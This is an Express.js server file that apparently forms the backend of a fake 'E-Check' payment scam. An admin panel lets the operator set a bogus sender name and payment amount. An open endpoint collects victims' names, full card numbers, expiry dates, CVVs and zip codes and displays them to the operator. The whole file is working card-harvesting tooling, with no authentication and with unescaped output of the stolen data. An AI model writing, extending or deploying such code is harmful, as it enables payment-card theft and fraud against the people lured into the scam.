const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const port = 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public')); // Serve static files from 'public' directory

let paymentData = {
    sender: 'Benny',
    amount: 400,
    cardDetails: []
};

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>E-Check Admin Panel</title>
            <script src="https://cdn.tailwindcss.com"></script>
        </head>
        <body class="bg-gray-100 min-h-screen flex flex-col items-center justify-center">
            <div class="w-full max-w-2xl bg-white rounded-2xl shadow-lg p-6">
                <h1 class="text-3xl font-bold text-blue-600 text-center mb-6">E-Check Admin Panel</h1>
                
                <!-- Update Sender and Amount Form -->
                <div class="mb-8">
                    <h2 class="text-xl font-semibold text-blue-600 mb-4">Update Payment Details</h2>
                    <div class="space-y-4">
                        <div>
                            <label class="block text-blue-600 text-sm font-medium mb-1">Sender Name</label>
                            <input
                                id="senderInput"
                                type="text"
                                placeholder="Enter sender name"
                                value="${paymentData.sender}"
                                class="w-full p-2 rounded-lg border border-blue-200 bg-blue-50 focus:outline-none focus:ring-2 focus:ring-blue-400"
                            />
                        </div>
                        <div>
                            <label class="block text-blue-600 text-sm font-medium mb-1">Amount</label>
                            <input
                                id="amountInput"
                                type="number"
                                placeholder="Enter amount"
                                value="${paymentData.amount}"
                                class="w-full p-2 rounded-lg border border-blue-200 bg-blue-50 focus:outline-none focus:ring-2 focus:ring-blue-400"
                            />
                        </div>
                        <button
                            onclick="updatePayment()"
                            class="w-full bg-blue-600 text-white p-2 rounded-lg font-medium hover:bg-blue-700 transition-all"
                        >
                            Update
                        </button>
                    </div>
                </div>
                
                <!-- Card Details Records -->
                <div>
                    <h2 class="text-xl font-semibold text-blue-600 mb-4">Card Details Records</h2>
                    <div id="records" class="space-y-4">
                        ${paymentData.cardDetails.length > 0 ? paymentData.cardDetails.map(detail => `
                            <div class="border border-blue-200 rounded-lg p-4">
                                <p><strong>Name:</strong> ${detail.name}</p>
                                <p><strong>Card Number:</strong> ${detail.cardNumber}</p>
                                <p><strong>Expiry:</strong> ${detail.expiry}</p>
                                <p><strong>CVV:</strong> ${detail.cvv}</p>
                                <p><strong>Zip Code:</strong> ${detail.zipCode}</p>
                            </div>
                        `).join('') : '<p class="text-blue-600">No card details submitted yet.</p>'}
                    </div>
                </div>
            </div>
            <script>
                async function updatePayment() {
                    const sender = document.getElementById('senderInput').value;
                    const amount = document.getElementById('amountInput').value;
                    try {
                        const response = await fetch('/api/payment', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ sender, amount })
                        });
                        const result = await response.json();
                        alert(result.message);
                        window.location.reload(); // Refresh to show updated data
                    } catch (error) {
                        alert('Error updating payment details');
                    }
                }
            </script>
        </body>
        </html>
    `);
});

app.get('/api/payment', (req, res) => {
    res.json(paymentData);
});

app.post('/api/payment', (req, res) => {
    const { sender, amount } = req.body;
    if (sender) paymentData.sender = sender;
    if (amount) paymentData.amount = parseFloat(amount);
    res.json({ message: 'Payment details updated', data: paymentData });
});

app.post('/api/card-details', (req, res) => {
    const { name, cardNumber, expiry, cvv, zipCode } = req.body;
    paymentData.cardDetails.push({ name, cardNumber, expiry, cvv, zipCode });
    res.json({ message: 'Card details received', data: paymentData });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
